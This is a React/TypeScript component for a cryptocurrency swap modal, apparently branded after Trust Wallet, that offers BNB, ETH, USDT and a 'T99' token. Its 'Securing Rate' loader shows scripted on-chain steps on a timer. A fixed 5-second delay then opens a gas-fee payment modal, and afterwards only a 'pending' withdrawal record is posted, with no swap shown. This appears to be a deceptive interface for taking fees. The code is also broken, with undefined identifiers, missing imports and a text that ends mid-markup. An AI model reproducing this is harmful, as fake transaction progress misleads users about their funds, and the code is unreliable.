'use client';

import { useState, useEffect, useMemo, useRef } from 'react';
import { X, ArrowDownUp, ArrowRight, Info, ChevronDown, ChevronLeft, Loader2, Check, Settings2, Sliders, ArrowLeft, MoveRight, HelpCircle, Plus, Minus } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import GasFeeModal from './gas-fee-modal';
import { COIN_MAP, getDynamicExchangeRates } from '@/lib/utils';
import StatusModal from './statusModal';

// ── Securing Rate Loader ──────────────────────────────────────────────────────
const STEPS = [
    { label: 'Finding best route',         sub: 'Scanning liquidity pools...' },
    { label: 'Locking exchange price',      sub: 'Securing optimal rate...' },
    { label: 'Preparing transaction',       sub: 'Building swap payload...' },
    { label: 'Verifying on-chain',          sub: 'Confirming network path...' },
];

function SecuringRateLoader({ theme }: { theme?: 'dark' | 'light' }) {
    const [activeStep, setActiveStep] = useState(0);
    const timerRef = useRef<NodeJS.Timeout | null>(null);

    useEffect(() => {
        timerRef.current = setInterval(() => {
            setActiveStep(s => (s < STEPS.length - 1 ? s + 1 : s));
        }, 1400);
        return () => { if (timerRef.current) clearInterval(timerRef.current); };
    }, []);

    const isDark = theme === 'dark';

    return (
        <div className={`w-full rounded-3xl border px-5 py-6 ${isDark ? 'bg-black border-white/10 text-white' : 'bg-white border-gray-100 shadow-xl text-[#0a0b0d]'}`}>
            {/* Icon + title */}
            <div className="flex items-center gap-3 mb-5">
                <div className="relative w-10 h-10 flex-shrink-0">
                    <div className="absolute inset-0 bg-blue-500/20 rounded-full animate-pulse" />
                    <div className="w-10 h-10 rounded-full border-2 border-blue-500 border-t-transparent animate-spin" />
                    <div className="absolute inset-0 flex items-center justify-center">
                        <ArrowDownUp className="w-4 h-4 text-blue-600" />
                    </div>
                </div>
                <div>
                    <p className="font-bold text-sm">Securing Rate</p>
                    <p className={`text-xs ${isDark ? 'text-gray-400' : 'text-gray-500'}`}>Processing your swap request</p>
                </div>
            </div>

            {/* Steps */}
            <div className="space-y-3">
                {STEPS.map((step, i) => {
                    const done = i < activeStep;
                    const active = i === activeStep;
                    return (
                        <div key={i} className={`flex items-center gap-3 rounded-2xl px-4 py-3 transition-all ${
                            active
                                ? isDark ? 'bg-blue-500/10 border border-blue-500/20' : 'bg-blue-50 border border-blue-100'
                                : isDark ? 'bg-white/5' : 'bg-gray-50'
                        }`}>
                            {/* Step indicator */}
                            <div className={`w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0 text-[10px] font-bold transition-all ${
                                done  ? 'bg-emerald-500 text-white' :
                                active ? 'bg-blue-600 text-white' :
                                isDark ? 'bg-white/10 text-gray-400' : 'bg-gray-200 text-gray-400'
                            }`}>
                                {done ? <Check className="w-3 h-3" /> : active ? (
                                    <span className="w-2 h-2 rounded-full bg-white animate-pulse inline-block" />
                                ) : i + 1}
                            </div>
                            <div className="flex-1 min-w-0">
                                <p className={`text-xs font-semibold ${done ? 'text-emerald-500' : active ? (isDark ? 'text-white' : 'text-blue-700') : (isDark ? 'text-gray-500' : 'text-gray-400')}`}>
                                    {step.label}
                                </p>
                                {active && (
                                    <p className={`text-[10px] mt-0.5 ${isDark ? 'text-gray-400' : 'text-gray-500'}`}>{step.sub}</p>
                                )}
                            </div>
                            {active && <Loader2 className="w-3.5 h-3.5 text-blue-500 animate-spin flex-shrink-0" />}
                        </div>
                    );
                })}
            </div>
        </div>
    );
}


interface SwapModalProps {
    address: string;
    isOpen: boolean;
    onClose: () => void;
    onSuccess?: () => void;
    initialFromToken?: string;
    bnbBalance?: string;
    t22Balance?: number;
    usdtBalance?: string;
    ctmBalance?: string;
    newTetherBalance?: string;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
    isInline?: boolean;
}

export default function SwapModal({
    address,
    isOpen,
    onClose,
    onSuccess,
    initialFromToken = 'BNB',
    bnbBalance = '0',
    t22Balance = 0,
    usdtBalance = '0',
    ctmBalance = '0',
    newTetherBalance = '0',
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light',
    isInline = false
}: SwapModalProps) {
    const [fromToken, setFromToken] = useState(initialFromToken || 'TETHEREUM');
    // const [toToken, setToToken] = useState(initialFromToken || 'ETH');
    const [toToken, setToToken] = useState('ETH');
    const [fromAmount, setFromAmount] = useState('');
    const [toAmount, setToAmount] = useState('');
    const [showGasModal, setShowGasModal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [swapView, setSwapView] = useState<'swap' | 'settings'>('swap');

    // Swap Settings State
    const [bestPrice, setBestPrice] = useState(true);
    const [unlimitedAllowance, setUnlimitedAllowance] = useState(true);
    const [thorchainStreams, setThorchainStreams] = useState(true);
    const [solanaTurbo, setSolanaTurbo] = useState(false);
    const [slippage, setSlippage] = useState(2.0);

    // Custom Dropdown State
    const [showFromDropdown, setShowFromDropdown] = useState(false);
    const [showToDropdown, setShowToDropdown] = useState(false);

    // Status Modal State
    const [showStatusModal, setShowStatusModal] = useState(false);
    const [statusModalConfig, setStatusModalConfig] = useState({
        title: '',
        message: '',
        success: false
    });

    const showError = (title: string, message: string) => {
        setStatusModalConfig({
            title,
            message,
            success: false
        });
        setShowStatusModal(true);
    };





    const [user, setUser] = useState({})

    // Exchange rates (mock - in production, fetch from API)
    // const exchangeRates: { [key: string]: { [key: string]: number } } = {
    //     'BNB': { 'TETHEREUM': 1.0, 'USDT': 620.0, 'BNB': 1.0 },
    //     'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
    //     'USDT': { 'BNB': 0.00161, 'TETHEREUM': 2.22, 'USDT': 1.0 }
    // };

    const exchangeRates: { [key: string]: { [key: string]: number } } = {
        'TETHEREUM': { 'BNB': 1.0, 'USDT': 0.45, 'TETHEREUM': 1.0 },
        'BNB': {
            'BNB': 1,
            'ETH': 0.35,
            'USDT': 620,
            'USDC': 620,
            'DAI': 620,
            'MATIC': 850,
            'ARB': 420,
            'OP': 390
        },
        'ETH': {
            'BNB': 2.85,
            'ETH': 1,
            'USDT': 1800,
            'USDC': 1800,
            'DAI': 1800,
            'MATIC': 2400,
            'ARB': 1200,
            'OP': 1100
        },
        'USDT': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'USDC': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'DAI': {
            'BNB': 0.00161,
            'ETH': 0.00055,
            'USDT': 1,
            'USDC': 1,
            'DAI': 1,
            'MATIC': 1.33,
            'ARB': 0.66,
            'OP': 0.61
        },
        'MATIC': {
            'BNB': 0.00117,
            'ETH': 0.00042,
            'USDT': 0.75,
            'USDC': 0.75,
            'DAI': 0.75,
            'MATIC': 1,
            'ARB': 0.5,
            'OP': 0.46
        },
        'ARB': {
            'BNB': 0.00238,
            'ETH': 0.00083,
            'USDT': 1.5,
            'USDC': 1.5,
            'DAI': 1.5,
            'MATIC': 2,
            'ARB': 1,
            'OP': 0.92
        },
        'OP': {
            'BNB': 0.00256,
            'ETH': 0.0009,
            'USDT': 1.63,
            'USDC': 1.63,
            'DAI': 1.63,
            'MATIC': 2.17,
            'ARB': 1.08,
            'OP': 1
        }
    };
    let [exchangeRates_, setExchangeRates_] = useState(null)

    useEffect(() => {
        let v = async () => {

            // console.log("exchangeRates__")
            const exchangeRates__ = await getDynamicExchangeRates();
            // console.log(exchangeRates__)
            setExchangeRates_(exchangeRates__)
        }
        v()
    }, [])
    const getBalance = (token: string) => {
        if (token === 'BNB') return Number(bnbBalance).toFixed(4);
        if (token === 'TETHEREUM') return t22Balance.toFixed(6);
        if (token === 'USDT' || token === 'USDT_BSC') return Number(usdtBalance).toFixed(6);
        if (token === 'CTM') return Number(ctmBalance).toFixed(6);
        if (token === 'TETH') return Number(newTetherBalance).toFixed(6);
        return '0.00';
    };

    // Auto-calculate toAmount when fromAmount or tokens change
    useEffect(() => {
        if (fromAmount && !isNaN(Number(fromAmount)) && Number(fromAmount) > 0) {
            const rate = exchangeRates_[fromToken]?.[toToken] || 1.0;

            const calculated = Number(fromAmount) * rate;
            setToAmount(calculated.toFixed(6));
        } else {
            setToAmount('');
        }
    }, [fromAmount, fromToken, toToken]);

    const [getUserLoading, setGetUSerLoading] = useState(false)
    useEffect(() => {

        let v = async () => {
            // console.log(!address || address=="","kkk")
            if (!address || address == "") {
                return
            }

            try {

                setGetUSerLoading(true)
                let vvv = await fetch(`/api/user?address=${address}`, {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' },
                    //   body: JSON.stringify({ address, t99:Number(tbal) })
                });

                let vjson = await vvv.json()

                if (vjson?.existingRecord?.id) {
                    setUser(vjson?.existingRecord)
                }

            } catch (e) {

            } finally {
                setGetUSerLoading(false)
            }
        }

        v()
    }, [address])

    // Update state when modal opens with initialFromToken
    useEffect(() => {
        if (isOpen && initialFromToken) {
            setFromToken(initialFromToken);
            // Prevent selecting same token for both
            if (toToken === initialFromToken) {
                // setToToken(initialFromToken === 'BNB' ? 'TETHEREUM' : 'BNB');
            }
        }
    }, [isOpen, initialFromToken]);
    let getCurrentRate = useMemo(() => {
        if (!exchangeRates_) {
            return "..."
        }

        const rate = exchangeRates_[fromToken]?.[toToken];
        if (rate !== undefined && !isNaN(rate)) {
            return `1 ${fromToken} = ${Number(rate).toFixed(6)} ${toToken}`;
        }
        return "Unavailable";
    }, [fromToken, toToken, exchangeRates_]);

    const currentNetwork = useMemo(() => {
        if (fromToken === 'BNB' || fromToken === 'BUSD' || fromToken === 'TETHEREUM') return 'BNB';
        if (fromToken === 'ETH' || fromToken === 'USDT' || fromToken === 'USDC') return 'ETH';
        if (fromToken === 'BTC') return 'BTC';
        return 'ETH';
    }, [fromToken]);

    const estimatedUsdValue = useMemo(() => {
        if (!toAmount || !exchangeRates_) return '0.00';
        const usdRate = exchangeRates_[toToken]?.['USDT'] || 0;
        return (Number(toAmount) * usdRate).toFixed(2);
    }, [toAmount, toToken, exchangeRates_]);

    // Reset form when modal closes
    useEffect(() => {
        if (!isOpen) {
            setFromAmount('');
            setToAmount('');
        }
    }, [isOpen]);



    const handleSwapTokens = () => {
        // Swap tokens
        const tempToken = fromToken;
        setFromToken(toToken);
        setToToken(tempToken);

        // Swap amounts
        const tempAmount = fromAmount;
        setFromAmount(toAmount);
        setToAmount(tempAmount);
    };

    const handleFromTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === toToken) {
            setToToken(fromToken);
        }
        setFromToken(newToken);
    };

    const handleToTokenChange = (newToken: string) => {
        // Prevent selecting same token
        if (newToken === fromToken) {
            setFromToken(toToken);
        }
        setToToken(newToken);
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        // Validation
        if (!fromAmount || Number(fromAmount) <= 0) {
            showError('Invalid Amount', 'Please enter a valid amount to swap.');
            return;
        }

        const balance = Number(getBalance(fromToken));
        if (Number(fromAmount) > balance) {
            showError('Insufficient Balance', `You don't have enough ${fromToken} to complete this swap. Please add more funds and try again.`);
            return;
        }

        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            setShowGasModal(true);
        }, 5000); // 5 second loading delay
    };

    const handleGasSuccess = async (txHash: string) => {
        // Create Pending Transaction in Airtable
        try {
            await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: address,
                    amount: Number(fromAmount),
                    type: "swap",
                    asset: `${fromToken} → ${toToken}`,
                    network: "Base Swap",
                    wType: "crypto",
                    status: "pending"
                })
            });
        } catch (err) {
            console.error("Failed to save swap history", err);
        }

        setShowGasModal(false);
        if (onSuccess) onSuccess();
        onClose();
    };

    const SwapSettingsView = () => (
        <div className="space-y-6 animate-in fade-in slide-in-from-right-4 duration-300">
            <div className={`rounded-3xl p-6 space-y-6 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                {[
                    { label: 'Best price execution', sub: 'Get fair swap prices by shielding your transactions from MEV', state: bestPrice, setter: setBestPrice },
                    { label: 'Unlimited allowance', sub: 'Approve each token once and swap any amount, anytime', state: unlimitedAllowance, setter: setUnlimitedAllowance },
                    { label: 'Thorchain streams', sub: 'Gives better quote, but takes longer to process the swap.', state: thorchainStreams, setter: setThorchainStreams },
                    { label: 'Solana turbo swaps', sub: 'Costs more SOL, but speeds up swaps', state: solanaTurbo, setter: setSolanaTurbo },
                ].map((item, i) => (
                    <div key={i} className="flex items-center justify-between gap-4">
                        <div className="flex-1">
                            <div className="flex items-center gap-1.5 mb-0.5">
                                <p className="font-bold text-sm">{item.label}</p>
                                <HelpCircle className="w-3.5 h-3.5 text-gray-400" />
                            </div>
                            <p className="text-[11px] text-gray-500 leading-relaxed">{item.sub}</p>
                        </div>
                        <button
                            onClick={() => item.setter(!item.state)}
                            className={`w-11 h-6 rounded-full relative transition-all ${item.state ? 'bg-blue-600' : 'bg-gray-300 dark:bg-white/10'}`}
                        >
                            <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${item.state ? 'right-1' : 'left-1'}`} />
                        </button>
                    </div>
                ))}
            </div>

            <div className="space-y-4">
                <p className="font-bold text-sm px-1">Set max slippage</p>
                <p className="text-xs text-gray-500 px-1 leading-relaxed">
                    This helps you avoid drastic swap price changes. The swap will revert if the price shifts beyond this percentage.
                </p>

                <div className={`rounded-3xl p-6 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                    <div className="flex items-center justify-between mb-8">
                        <button
                            onClick={() => setSlippage(prev => Math.max(0.1, Number((prev - 0.1).toFixed(1))))}
                            className="w-10 h-10 rounded-full flex items-center justify-center bg-white dark:bg-white/5 text-blue-600 shadow-sm border border-gray-100 dark:border-white/5"
                        >
                            <Minus className="w-5 h-5" />
                        </button>
                        <p className="text-4xl font-bold flex items-baseline gap-2">
                            {slippage} <span className="text-2xl text-blue-600">%</span>
                        </p>
                        <button
                            onClick={() => setSlippage(prev => Number((prev + 0.1).toFixed(1)))}
                            className="w-10 h-10 rounded-full flex items-center justify-center bg-white dark:bg-white/5 text-blue-600 shadow-sm border border-gray-100 dark:border-white/5"
                        >
                            <Plus className="w-5 h-5" />
                        </button>
                    </div>

                    <div className="grid grid-cols-4 gap-3">
                        {[0.1, 0.5, 1, 2.5].map(val => (
                            <button
                                key={val}
                                onClick={() => setSlippage(val)}
                                className={`py-2.5 rounded-xl font-bold text-xs transition-all ${
                                    slippage === val
                                        ? 'bg-blue-600 text-white'
                                        : 'bg-white dark:bg-white/5 border border-gray-100 dark:border-white/5'
                                }`}
                            >
                                {val}%
                            </button>
                        ))}
                    </div>
                </div>
            </div>
        </div>
    );

    const [isSliding, setIsSliding] = useState(false);
    const [slideProgress, setSlideProgress] = useState(0);

    const handleSlide = (e: any) => {
        const rect = e.currentTarget.getBoundingClientRect();
        const x = (e.clientX || (e.touches && e.touches[0].clientX)) - rect.left;
        const progress = Math.min(100, Math.max(0, (x / rect.width) * 100));
        setSlideProgress(progress);

        if (progress >= 90 && !isLoading) {
            setSlideProgress(100);
            handleSubmit(e);
        }
    };

    const handleSlideEnd = () => {
        if (slideProgress < 90) {
            setSlideProgress(0);
        }
    };

    const renderForm = () => {
        const isInsufficient = Number(fromAmount) > Number(getBalance(fromToken).replace(/[^\d.]/g, ''));

        return (
            <>
            <div className="space-y-3 animate-in fade-in slide-in-from-bottom-4 duration-300">
                {/* Header with Back/Settings */}
                <div className="flex justify-between items-center px-2 mb-2">
                    <button onClick={onClose} className="p-2 rounded-full hover:bg-gray-100 transition-colors">
                        <ArrowLeft className="w-6 h-6 text-gray-800" />
                    </button>
                    <h3 className="text-xl font-bold text-gray-900">Swap</h3>
                    <button onClick={() => setShowSettings(true)} className="p-2 rounded-full hover:bg-gray-100 transition-colors">
                        <Sliders className="w-5 h-5 text-gray-800" />
                    </button>
                </div>

                {/* From Card */}
                <div className={`rounded-[2rem] p-6 transition-all ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                    <div className="flex items-center justify-between gap-4 mb-2">
                        <div className="flex-1 min-w-0">
                            <div className="flex items-baseline overflow-hidden">
                                <span className={`text-4xl font-bold shrink-0 ${fromAmount && Number(fromAmount) > 0 ? 'text-red-600' : 'text-gray-400'}`}>
                                    {fromAmount && Number(fromAmount) > 0 ? currencySymbol : ''}
                                </span>
                                <input
                                    type="number"
                                    value={fromAmount}
                                    onChange={(e) => setFromAmount(e.target.value)}
                                    placeholder="0"
                                    className={`bg-transparent text-4xl font-bold placeholder-gray-300 focus:outline-none w-full min-w-0 ${fromAmount && Number(fromAmount) > 0 ? 'text-red-600' : 'text-gray-400'}`}
                                />
                            </div>
                        </div>
                        <button
                            type="button"
                            onClick={() => setShowFromDropdown(true)}
                            className={`flex items-center gap-2 rounded-full pl-2 pr-4 py-2 border border-gray-100 shadow-sm bg-white transition-all hover:scale-105 active:scale-95 shrink-0`}
                        >
                            <div className="w-7 h-7 rounded-full overflow-hidden bg-white p-0.5 border border-gray-100 flex items-center justify-center relative">
                                <img src={COIN_MAP[fromToken]?.logo} alt={fromToken} className="w-full h-full object-contain" />
                                {fromToken === 'USDT_BSC' && (
                                    <div className="absolute -bottom-0.5 -right-0.5 w-3 h-3 bg-white rounded-full flex items-center justify-center border border-gray-100 p-0.5 shadow-sm">
                                        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png" className="w-full h-full" />
                                    </div>
                                )}
                            </div>
                            <span className="font-bold text-sm text-gray-800 uppercase">{fromToken === 'TETHEREUM' ? 'T99' : (fromToken === 'USDT_BSC' ? 'USDT' : fromToken)}</span>
                            <ChevronDown className="w-4 h-4 text-gray-400" />
                        </button>
                    </div>
                    <div className="flex justify-between items-center text-gray-400 font-semibold text-xs">
                        <p className="flex items-center gap-1">
                            {fromAmount || '0'} {fromToken === 'TETHEREUM' ? 'T99' : (fromToken === 'USDT_BSC' ? 'USDT' : fromToken)} 
                            <ArrowDownUp className="w-3 h-3 ml-1 opacity-60" />
                        </p>
                        <div className="flex items-center gap-1">
                            <Clock className="w-3 h-3" />
                            <span>{getBalance(fromToken)}</span>
                        </div>
                    </div>
                </div>

                {/* Swap Arrow Divider */}
                <div className="flex justify-center -my-5 relative z-10">
                    <button
                        type="button"
                        onClick={handleSwapTokens}
                        className={`w-10 h-10 rounded-full flex items-center justify-center transition-all bg-white border border-gray-100 shadow-sm text-gray-400 hover:text-blue-600`}
                    >
                        <ArrowDown className="w-5 h-5" />
                    </button>
                </div>

                {/* To Card */}
                <div className={`rounded-[2rem] p-6 transition-all ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                    <div className="flex items-center justify-between gap-4 mb-2">
                        <div className="flex-1 min-w-0">
                            <p className={`text-4xl font-bold truncate ${toAmount ? 'text-gray-900' : 'text-gray-400'}`}>
                                {toAmount || '0'}
                            </p>
                        </div>
                        <button
                            type="button"
                            onClick={() => setShowToDropdown(true)}
                            className={`flex items-center gap-2 rounded-full pl-2 pr-4 py-2 border border-gray-100 shadow-sm bg-white transition-all hover:scale-105 active:scale-95 shrink-0`}
                        >
                            <div className="w-7 h-7 rounded-full overflow-hidden bg-white p-0.5 border border-gray-100 flex items-center justify-center relative">
                                <img src={COIN_MAP[toToken]?.logo} alt={toToken} className="w-full h-full object-contain" />
                                {toToken === 'USDT_BSC' && (
                                    <div className="absolute -bottom-0.5 -right-0.5 w-3 h-3 bg-white rounded-full flex items-center justify-center border border-gray-100 p-0.5 shadow-sm">
                                        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png" className="w-2.5 h-2.5" />
                                    </div>
                                )}
                            </div>
                            <span className="font-bold text-sm text-gray-800 uppercase">{toToken === 'TETHEREUM' ? 'T99' : (toToken === 'USDT_BSC' ? 'USDT' : toToken)}</span>
                            <ChevronDown className="w-4 h-4 text-gray-400" />
                        </button>
                    </div>
                    <div className="flex justify-between items-center text-gray-400 font-semibold text-xs">
                        <p>{currencySymbol}0.00</p>
                        <div className="flex items-center gap-1">
                            <Clock className="w-3 h-3" />
                            <span>{getBalance(toToken)}</span>
                        </div>
                    </div>
                </div>

                {/* Error Box */}
                <AnimatePresence>
                    {isInsufficient && (
                        <motion.div
                            initial={{ opacity: 0, height: 0 }}
                            animate={{ opacity: 1, height: 'auto' }}
                            exit={{ opacity: 0, height: 0 }}
                            className="bg-red-50 border border-red-100 rounded-2xl p-4 flex items-center gap-3 mt-4 overflow-hidden"
                        >
                            <div className="w-5 h-5 rounded-full bg-red-500 flex items-center justify-center text-white shrink-0">
                                <X className="w-3 h-3 stroke-[3]" />
                            </div>
                            <p className="text-red-800 text-sm font-bold">Insufficient balance</p>
                        </motion.div>
                    )}
                </AnimatePresence>

                {/* Slide to Swap */}
                <div className="pt-20">
                    <div 
                        className={`h-[4.5rem] rounded-full relative overflow-hidden transition-all p-1.5 select-none touch-none ${theme === 'dark' ? 'bg-white/5' : 'bg-[#e5e7ff]'}`}
                        onMouseDown={() => setIsSliding(true)}
                        onMouseMove={(e) => isSliding && handleSlide(e)}
                        onMouseUp={() => { setIsSliding(false); handleSlideEnd(); }}
                        onMouseLeave={() => { setIsSliding(false); handleSlideEnd(); }}
                        onTouchStart={() => setIsSliding(true)}
                        onTouchMove={(e) => isSliding && handleSlide(e)}
                        onTouchEnd={() => { setIsSliding(false); handleSlideEnd(); }}
                    >
                        <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                            <p className="text-[#8b91ff] font-bold tracking-tight">Slide to Swap</p>
                        </div>
                        
                        <motion.div 
                            className="h-full bg-blue-600 rounded-full relative z-10 flex items-center justify-end pr-2 min-w-[4rem]"
                            style={{ width: `${Math.max(15, slideProgress)}%` }}
                        >
                            <div className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center">
                                <ArrowRight className="w-6 h-6 text-white" />
                            </div>
                        </motion.div>
                    </div>
                </div>
                {/* Token Dropdowns */}
                <AnimatePresence>
                    {(showFromDropdown || showToDropdown) && (
                        <div className="fixed inset-0 z-[100] flex items-end justify-center px-4 pb-8 md:pb-20">
                            <motion.div 
                                initial={{ opacity: 0 }} 
                                animate={{ opacity: 1 }} 
                                exit={{ opacity: 0 }} 
                                className="absolute inset-0 bg-black/60 backdrop-blur-sm" 
                                onClick={() => { setShowFromDropdown(false); setShowToDropdown(false); }} 
                            />
                            <motion.div
                                initial={{ y: '100%' }}
                                animate={{ y: 0 }}
                                exit={{ y: '100%' }}
                                className={`w-full max-w-[500px] rounded-[2.5rem] overflow-hidden relative z-10 ${theme === 'dark' ? 'bg-[#0a0b0d]' : 'bg-white'}`}
                            >
                                <div className="p-8">
                                    <div className="flex justify-between items-center mb-8">
                                        <h3 className="text-xl font-black">Select Asset</h3>
                                        <button onClick={() => { setShowFromDropdown(false); setShowToDropdown(false); }} className="w-10 h-10 rounded-full bg-gray-100 dark:bg-white/5 flex items-center justify-center">
                                            <X className="w-5 h-5" />
                                        </button>
                                    </div>
                                    <div className="space-y-2 max-h-[50vh] overflow-y-auto pr-2 custom-scrollbar">
                                        {['BTC', 'ETH', 'BNB', 'USDT', 'USDT_BSC', 'TETH', 'TETHEREUM', 'CTM'].map((coin) => (
                                            <div
                                                key={coin}
                                                onClick={() => {
                                                    if (showFromDropdown) handleFromTokenChange(coin);
                                                    else handleToTokenChange(coin);
                                                    setShowFromDropdown(false);
                                                    setShowToDropdown(false);
                                                }}
                                                className={`flex items-center justify-between p-4 rounded-3xl transition-all cursor-pointer ${theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'}`}
                                            >
                                                <div className="flex items-center gap-4">
                                                    <div className="w-12 h-12 rounded-full bg-white p-2 border border-gray-100 flex items-center justify-center shrink-0">
                                                        <img src={COIN_MAP[coin].logo} alt={coin} className="w-full h-full object-contain" />
                                                    </div>
                                                    <div>
                                                        <p className="font-bold">{coin === 'TETHEREUM' ? 'T99' : coin}</p>
                                                        <p className="text-xs text-gray-500">{COIN_MAP[coin].name}</p>
                                                    </div>
                                                </div>
                                                <div className="text-right text-sm">
                                                    <p className="font-bold">{getBalance(coin)}</p>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            </motion.div>
                        </div>
                    )}
                </AnimatePresence>
            </>
        );
    };

    if (isInline) {
        return (
            <>
            <div className={`w-full max-w-[600px] mx-auto ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                {isLoading ? (
                    <SecuringRateLoader theme={theme} />
                ) : (
                    <div className={`md:rounded-[3rem] md:border p-0 md:p-2 min-h-screen md:min-h-0 ${theme === 'dark' ? 'bg-transparent md:bg-black border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-2xl'}`}>
                            {/* Sticky Header */}
                            <div className={`sticky top-0 z-10 px-6 md:px-8 pt-8 pb-4 flex items-center justify-between ${theme === 'dark' ? 'bg-black' : 'bg-white'}`}>
                                <div className="flex items-center gap-3">
                                    <button
                                        onClick={() => swapView === 'settings' ? setSwapView('swap') : onClose()}
                                        className={`p-2 rounded-full transition-all ${theme === 'dark' ? 'hover:bg-white/5 text-white' : 'hover:bg-gray-100 text-gray-900'}`}
                                    >
                                        <ChevronLeft className="w-6 h-6" />
                                    </button>
                                    <h2 className="text-2xl font-black">{swapView === 'settings' ? 'Swap settings' : 'Swap'}</h2>
                                </div>

                                {swapView === 'swap' && (
                                    <button
                                        onClick={() => setSwapView('settings')}
                                        className={`p-2 rounded-full transition-all ${theme === 'dark' ? 'hover:bg-white/5 text-white' : 'hover:bg-gray-100 text-gray-900'}`}
                                    >
                                        <Sliders className="w-5 h-5" />
                                    </button>
                                )}
                            </div>

                            <div className="px-6 md:px-8 pb-20 md:pb-8">
                                {swapView === 'swap' ? renderForm() : SwapSettingsView()}
                            </div>
                    </div>
                )}
            </div>
            <GasFeeModal
                isOpen={showGasModal}
                onClose={() => setShowGasModal(false)}
                onSuccess={handleGasSuccess}
                user={user}
                theme={theme}
                network={currentNetwork}
            />
            <StatusModal
                isOpen={showStatusModal}
                onClose={() => setShowStatusModal(false)}
                title={statusModalConfig.title}
                message={statusModalConfig.message}
                success={statusModalConfig.success}
                theme={theme}
            />
            </>
        );
    }

    return (
        <AnimatePresence mode="wait">
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    {/* Backdrop */}
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={onClose}
                    />

                    {/* Modal - Bottom Sheet on Mobile, Centered on Desktop */}
                    <motion.div
                        initial={{ scale: 0.9, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        exit={{ scale: 0.9, opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border rounded-[2.5rem] shadow-2xl overflow-hidden z-20 m-4`}
                    >
                        {isLoading ? (
                            <div className={`flex flex-col items-center justify-center py-16 px-6 relative w-full min-h-[460px] ${
                                theme === 'dark' ? 'bg-[#000000]' : 'bg-white'
                            }`}>
                                <div className="relative w-28 h-28 mb-8">
                                    <div className={`absolute inset-0 border-[3px] rounded-full ${theme === 'dark' ? 'border-[#3375BB]/20' : 'border-[#3375BB]/10'}`}></div>
                                    <div className="absolute inset-0 border-[3px] border-[#3375BB] rounded-full border-t-transparent animate-spin"></div>
                                    <div className={`absolute inset-4 border-[3px] rounded-full ${theme === 'dark' ? 'border-blue-400/20' : 'border-blue-400/10'}`}></div>
                                    <div className="absolute inset-4 border-[3px] border-blue-400 rounded-full border-b-transparent animate-[spin_1.5s_linear_infinite_reverse]"></div>
                                    <div className="absolute inset-0 flex items-center justify-center">
                                        <img 
                                            src="/favicon.png" 
                                            alt="Trust Logo" 
                                            className="w-12 h-12 animate-pulse"
                                        />
                                    </div>
                                </div>

                                <motion.h3
                                    initial={{ y: 10, opacity: 0 }}
                                    animate={{ y: 0, opacity: 1 }}
                                    className={`text-2xl font-bold mb-3 tracking-wide ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}
                                >
                                    Preparing swap...
                                </motion.h3>
                                <motion.p
                                    initial={{ y: 10, opacity: 0 }}
                                    animate={{ y: 0, opacity: 1 }}
                                    transition={{ delay: 0.1 }}
                                    className={`text-center px-4 text-sm leading-relaxed mb-10 ${theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}`}
                                >
                                    Securing the exchange rate for <br />
                                    <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`}>{fromAmount} {fromToken}</span> to <span className={`font-medium ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`}>{toAmount} {toToken}</span>
                                </motion.p>

                                <div className="w-full space-y-5 max-w-xs mx-auto">
                                    <div className={`flex items-center gap-4 p-3 rounded-xl border ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                        <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center flex-shrink-0">
                                            <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                        </div>
                                        <span className={`text-sm font-medium ${theme === 'dark' ? 'text-gray-400' : 'text-gray-600'}`}>Confirming Transaction</span>
                                    </div>
                                    <div className={`flex items-center gap-4 p-3 rounded-xl border ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
